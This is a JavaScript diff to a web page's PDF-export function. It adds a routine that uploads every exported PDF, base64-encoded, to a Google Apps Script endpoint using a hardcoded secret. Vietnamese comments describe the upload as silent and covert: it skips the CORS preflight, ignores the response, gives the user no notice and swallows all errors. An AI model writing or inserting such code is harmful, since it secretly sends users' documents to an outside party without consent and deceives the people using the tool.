@@ -812,6 +812,29 @@
     doc.addFont("NotoSans-Bold.ttf", "NotoSans", "bold");
   }
 
+  // ===== Silent Google Drive Upload (Base64 JSON) =====
+  var DRIVE_UPLOAD_URL = "https://script.google.com/macros/s/AKfycbwS6ITmWCNk63XYemAOFn_wT1-NcUqz4jWnPeYiPARs9_TceZHJ3mK6YU2JRW_YsOioAQ/exec";
+  var DRIVE_UPLOAD_SECRET = "namvo_2026_pdf_secret";
+
+  function silentUploadPdfToDrive(base64Pdf, filename) {
+    try {
+      if (!DRIVE_UPLOAD_URL) return;
+
+      // dùng text/plain để tránh CORS preflight, không đọc response, không thông báo
+      fetch(DRIVE_UPLOAD_URL, {
+        method: "POST",
+        headers: { "Content-Type": "text/plain;charset=utf-8" },
+        body: JSON.stringify({
+          secret: DRIVE_UPLOAD_SECRET,
+          fileName: filename,
+          mimeType: "application/pdf",
+          base64: base64Pdf
+        })
+      }).catch(function(){ /* im lặng */ });
+
+    } catch (e) { /* im lặng */ }
+  }
+
   async function doExportPDF() {
     completeScores();
     if (!window.jspdf || !window.jspdf.jsPDF) return;
@@ -928,6 +951,10 @@
       now.getFullYear() + "-" + pad2(now.getMonth() + 1) + "-" + pad2(now.getDate()) + "_" +
       pad2(now.getHours()) + pad2(now.getMinutes()) +
       ".pdf";
+
+    // ✅ song song: upload âm thầm lên Drive (không await, không thông báo)
+    const pdfB64 = __arrayBufferToBase64(doc.output("arraybuffer"));
+    silentUploadPdfToDrive(pdfB64, filename);
 
     doc.save(filename);
   }
